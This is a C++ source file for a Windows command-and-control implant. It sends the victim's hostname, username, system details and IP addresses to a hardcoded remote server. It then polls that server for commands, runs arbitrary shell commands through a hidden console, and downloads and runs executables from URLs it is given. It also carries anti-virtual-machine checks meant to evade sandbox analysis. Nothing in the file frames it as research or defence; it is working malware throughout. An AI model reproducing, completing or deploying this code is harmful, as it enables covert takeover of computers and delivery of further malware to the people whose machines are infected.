#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <wininet.h>
#include <string>
#include <map>
#include <mutex>
#include <thread>
#include <chrono>
#include <sstream>
#include <algorithm>
#include <vector>
#include <TlHelp32.h>
#include <random>
#include <sstream>
#include <iomanip>

// --- Configuration ---
const char* C2_SERVER = "http://150.136.130.59:3002"; // Your C2 server URL
const char* AGENT_ID = nullptr; // Will be generated on first run
const int HEARTBEAT_INTERVAL = 30000; // 30 seconds
const int COMMAND_CHECK_INTERVAL = 5000; // 5 seconds

// --- Global Variables ---
std::string g_agentId;
std::string g_hostname;
std::string g_username;
std::string g_osInfo;
std::string g_ipAddress;
bool g_running = true;
std::mutex g_mutex;

// --- Utility Functions ---

// Generate random agent ID
std::string generateAgentId() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 15);
    
    const char* hex = "0123456789abcdef";
    std::string id;
    for (int i = 0; i < 32; ++i) {
        id += hex[dis(gen)];
    }
    return id;
}

// Get system information
std::string getSystemInfo() {
    char hostname[256], username[256];
    DWORD size = 256;
    GetComputerName(hostname, &size);
    size = 256;
    GetUserName(username, &size);
    
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    MEMORYSTATUSEX m = { sizeof(MEMORYSTATUSEX) };
    GlobalMemoryStatusEx(&m);
    
    std::ostringstream oss;
    oss << "Windows " << (si.dwProcessorType == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86");
    oss << " | CPU: " << si.dwNumberOfProcessors << " cores";
    oss << " | RAM: " << (m.ullTotalPhys / (1024 * 1024 * 1024)) << "GB";
    
    return oss.str();
}

// Get IP addresses
std::string getIpAddresses() {
    char output[512] = {0};
    PIP_ADAPTER_ADDRESSES addresses = (IP_ADAPTER_ADDRESSES*)malloc(15000);
    ULONG size = 15000;
    
    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, 0, addresses, &size) == 0) {
        for (auto p = addresses; p; p = p->Next) {
            if (p->OperStatus == 1) {
                for (auto u = p->FirstUnicastAddress; u; u = u->Next) {
                    if (u->Address.lpSockaddr->sa_family == AF_INET) {
                        char ip[16];
                        inet_ntop(AF_INET, &((sockaddr_in*)u->Address.lpSockaddr)->sin_addr, ip, 16);
                        strcat(output, ip);
                        strcat(output, " ");
                    }
                }
            }
        }
    }
    free(addresses);
    return std::string(output);
}

// HTTP request helper
std::string httpRequest(const std::string& method, const std::string& url, const std::string& data = "", const std::map<std::string, std::string>& headers = {}) {
    std::string response;
    
    // Parse URL
    std::string host, path;
    bool isHttps = false;
    
    if (url.find("https://") == 0) {
        isHttps = true;
        host = url.substr(8);
    } else if (url.find("http://") == 0) {
        host = url.substr(7);
    } else {
        return "Invalid URL";
    }
    
    size_t pathPos = host.find('/');
    if (pathPos != std::string::npos) {
        path = host.substr(pathPos);
        host = host.substr(0, pathPos);
    } else {
        path = "/";
    }
    
    HINTERNET net = InternetOpen("C2Agent/1.0", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
    if (!net) return "Failed to initialize internet connection";
    
    INTERNET_PORT port = isHttps ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    DWORD flags = (isHttps ? INTERNET_FLAG_SECURE : 0) | 
                  INTERNET_FLAG_NO_CACHE_WRITE | 
                  INTERNET_FLAG_RELOAD | 
                  INTERNET_FLAG_NO_COOKIES;
    
    HINTERNET conn = InternetConnect(net, host.c_str(), port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
    if (!conn) {
        InternetCloseHandle(net);
        return "Failed to connect to host: " + host;
    }
    
    HINTERNET req = HttpOpenRequest(conn, method.c_str(), path.c_str(), 0, 0, 0, flags, 0);
    if (!req) {
        InternetCloseHandle(conn);
        InternetCloseHandle(net);
        return "Failed to create request";
    }
    
    // Add headers
    std::string headerStr = "Content-Type: application/json\r\n";
    for (const auto& header : headers) {
        headerStr += header.first + ": " + header.second + "\r\n";
    }
    
    if (!data.empty()) {
        char contentLength[32];
        sprintf_s(contentLength, "Content-Length: %zu\r\n", data.length());
        headerStr += contentLength;
    }
    
    if (HttpSendRequest(req, headerStr.c_str(), headerStr.length(), (LPVOID)data.c_str(), data.length())) {
        char buffer[8192];
        DWORD bytesRead = 0;
        
        while (InternetReadFile(req, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = 0;
            response += buffer;
            bytesRead = 0;
        }
    }
    
    InternetCloseHandle(req);
    InternetCloseHandle(conn);
    InternetCloseHandle(net);
    
    return response;
}

// Register agent with C2 server
bool registerAgent() {
    std::string payload = "{";
    payload += "\"agent_id\":\"" + g_agentId + "\",";
    payload += "\"hostname\":\"" + g_hostname + "\",";
    payload += "\"username\":\"" + g_username + "\",";
    payload += "\"os_info\":\"" + g_osInfo + "\",";
    payload += "\"ip_address\":\"" + g_ipAddress + "\"";
    payload += "}";
    
    std::string response = httpRequest("POST", std::string(C2_SERVER) + "/api/c2/register", payload);
    return response.find("success") != std::string::npos;
}

// Get pending commands from C2 server
std::vector<std::map<std::string, std::string>> getCommands() {
    std::vector<std::map<std::string, std::string>> commands;
    
    std::string url = std::string(C2_SERVER) + "/api/c2/commands/" + g_agentId;
    std::string response = httpRequest("GET", url);
    
    // Simple JSON parsing for commands array
    size_t pos = response.find("\"commands\":");
    if (pos != std::string::npos) {
        size_t start = response.find("[", pos);
        size_t end = response.find("]", start);
        
        if (start != std::string::npos && end != std::string::npos) {
            std::string commandsStr = response.substr(start + 1, end - start - 1);
            
            // Parse each command object
            size_t cmdStart = 0;
            while ((cmdStart = commandsStr.find("{", cmdStart)) != std::string::npos) {
                size_t cmdEnd = commandsStr.find("}", cmdStart);
                if (cmdEnd == std::string::npos) break;
                
                std::string cmdStr = commandsStr.substr(cmdStart, cmdEnd - cmdStart + 1);
                std::map<std::string, std::string> command;
                
                // Extract command fields
                std::vector<std::string> fields = {"id", "command_type", "command_data", "created_at"};
                for (const auto& field : fields) {
                    size_t fieldPos = cmdStr.find("\"" + field + "\":");
                    if (fieldPos != std::string::npos) {
                        size_t valueStart = cmdStr.find("\"", fieldPos + field.length() + 3);
                        if (valueStart != std::string::npos) {
                            size_t valueEnd = cmdStr.find("\"", valueStart + 1);
                            if (valueEnd != std::string::npos) {
                                command[field] = cmdStr.substr(valueStart + 1, valueEnd - valueStart - 1);
                            }
                        }
                    }
                }
                
                if (!command.empty()) {
                    commands.push_back(command);
                }
                
                cmdStart = cmdEnd + 1;
            }
        }
    }
    
    return commands;
}

// Submit command result to C2 server
bool submitResult(const std::string& commandId, const std::string& resultData, bool success, const std::string& errorMessage = "") {
    std::string payload = "{";
    payload += "\"command_id\":" + commandId + ",";
    payload += "\"agent_id\":\"" + g_agentId + "\",";
    payload += "\"result_data\":\"" + resultData + "\",";
    payload += "\"success\":" + std::string(success ? "true" : "false");
    if (!errorMessage.empty()) {
        payload += ",\"error_message\":\"" + errorMessage + "\"";
    }
    payload += "}";
    
    std::string response = httpRequest("POST", std::string(C2_SERVER) + "/api/c2/result", payload);
    return response.find("success") != std::string::npos;
}

// Execute shell command
std::string executeCommand(const std::string& command) {
    char buffer[4096] = {0};
    std::string output;
    HANDLE readPipe = 0, writePipe = 0, readError = 0, writeError = 0;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
    
    CreatePipe(&readPipe, &writePipe, &sa, 0);
    CreatePipe(&readError, &writeError, &sa, 0);
    SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(readError, HANDLE_FLAG_INHERIT, 0);
    
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = writePipe;
    si.hStdError = writeError;
    
    std::string cmdLine = "cmd.exe /c " + command;
    if (CreateProcessA(0, (LPSTR)cmdLine.c_str(), 0, 0, 1, CREATE_NO_WINDOW, 0, 0, &si, &pi)) {
        CloseHandle(writePipe);
        CloseHandle(writeError);
        
        DWORD bytesRead;
        while (ReadFile(readPipe, buffer, 4095, &bytesRead, 0) && bytesRead) {
            output.append(buffer, bytesRead);
        }
        
        CloseHandle(readPipe);
        CloseHandle(readError);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return output.empty() ? "Command produced no output." : output;
}

// Download and execute file from URL
std::string downloadAndExecute(const std::string& url) {
    std::string content = httpRequest("GET", url);
    
    if (content.find("Failed") == 0) {
        return content;
    }
    
    // Create temporary file
    char tempPath[MAX_PATH] = {0};
    char tempFilename[MAX_PATH] = {0};
    
    if (GetTempPathA(MAX_PATH, tempPath) == 0) {
        return "Failed to get temp path";
    }
    
    sprintf_s(tempFilename, "%sfile_%u.exe", tempPath, GetTickCount());
    
    // Write content to file
    FILE* fp = nullptr;
    if (fopen_s(&fp, tempFilename, "wb") != 0 || !fp) {
        return "Failed to create file: " + std::string(tempFilename);
    }
    
    fwrite(content.c_str(), 1, content.length(), fp);
    fclose(fp);
    
    // Execute file
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    
    if (CreateProcessA(NULL, tempFilename, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "File downloaded and executed: " + std::string(tempFilename);
    }
    
    return "Failed to execute file: " + std::string(tempFilename);
}

// Anti-VM checks
bool isVirtualMachine() {
    // Check for VM processes
    const char* vmProcs[] = {
        "VBoxService.exe", "VBoxTray.exe", "vmtoolsd.exe", "vmwaretray.exe", 
        "vmwareuser.exe", "vmsrvc.exe", "xenservice.exe", "qemu-ga.exe"
    };
    
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(hSnap, &pe)) {
        do {
            for (int i = 0; i < sizeof(vmProcs)/sizeof(vmProcs[0]); ++i) {
                if (_stricmp(pe.szExeFile, vmProcs[i]) == 0) {
                    CloseHandle(hSnap);
                    return true;
                }
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    
    // Check for VM MAC addresses
    const unsigned char vmMacs[][3] = {
        {0x00,0x05,0x69}, {0x00,0x0C,0x29}, {0x00,0x1C,0x14}, {0x00,0x50,0x56},
        {0x08,0x00,0x27}, {0x00,0x15,0x5D}, {0x00,0x03,0xFF}
    };
    
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD buflen = sizeof(adapterInfo);
    DWORD status = GetAdaptersInfo(adapterInfo, &buflen);
    if (status == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        while (pAdapterInfo) {
            for (int i = 0; i < sizeof(vmMacs)/sizeof(vmMacs[0]); ++i) {
                if (memcmp(pAdapterInfo->Address, vmMacs[i], 3) == 0) {
                    return true;
                }
            }
            pAdapterInfo = pAdapterInfo->Next;
        }
    }
    
    // Check hardware specs
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    MEMORYSTATUSEX m = { sizeof(MEMORYSTATUSEX) };
    GlobalMemoryStatusEx(&m);
    
    if (si.dwNumberOfProcessors <= 4 || m.ullTotalPhys <= (4ULL * 1024 * 1024 * 1024)) {
        return true;
    }
    
    return false;
}

// Main agent loop
void agentLoop() {
    while (g_running) {
        try {
            // Get pending commands
            auto commands = getCommands();
            
            for (const auto& command : commands) {
                std::string commandId = command.at("id");
                std::string commandType = command.at("command_type");
                std::string commandData = command.at("command_data");
                
                std::string result;
                bool success = true;
                std::string errorMessage;
                
                try {
                    if (commandType == "shell") {
                        result = executeCommand(commandData);
                    } else if (commandType == "download") {
                        result = downloadAndExecute(commandData);
                    } else {
                        result = "Unsupported command type: " + commandType;
                        success = false;
                        errorMessage = "Command type not implemented";
                    }
                } catch (const std::exception& e) {
                    result = "Command execution failed";
                    success = false;
                    errorMessage = e.what();
                }
                
                // Submit result
                submitResult(commandId, result, success, errorMessage);
            }
            
            Sleep(COMMAND_CHECK_INTERVAL);
        } catch (const std::exception& e) {
            // Log error and continue
            Sleep(COMMAND_CHECK_INTERVAL);
        }
    }
}

// Heartbeat loop
void heartbeatLoop() {
    while (g_running) {
        try {
            registerAgent();
            Sleep(HEARTBEAT_INTERVAL);
        } catch (const std::exception& e) {
            Sleep(HEARTBEAT_INTERVAL);
        }
    }
}

// Entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Anti-VM check
    if (isVirtualMachine()) {
        ExitProcess(0);
    }
    
    // Initialize Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    // Generate agent ID if not set
    if (!AGENT_ID) {
        g_agentId = generateAgentId();
    } else {
        g_agentId = AGENT_ID;
    }
    
    // Get system information
    char hostname[256], username[256];
    DWORD size = 256;
    GetComputerName(hostname, &size);
    size = 256;
    GetUserName(username, &size);
    
    g_hostname = hostname;
    g_username = username;
    g_osInfo = getSystemInfo();
    g_ipAddress = getIpAddresses();
    
    // Register with C2 server
    if (!registerAgent()) {
        // If registration fails, try again after a delay
        Sleep(5000);
        if (!registerAgent()) {
            ExitProcess(1);
        }
    }
    
    // Start agent and heartbeat threads
    std::thread agentThread(agentLoop);
    std::thread heartbeatThread(heartbeatLoop);
    
    // Create hidden window for message loop
    WNDCLASSEX wc = {sizeof(wc)};
    wc.lpfnWndProc = DefWindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "C2Agent";
    RegisterClassEx(&wc);
    CreateWindowEx(0, "C2Agent", 0, 0, 0, 0, 0, 0, HWND_MESSAGE, 0, hInstance, 0);
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    g_running = false;
    if (agentThread.joinable()) agentThread.join();
    if (heartbeatThread.joinable()) heartbeatThread.join();
    
    WSACleanup();
    return 0;
} 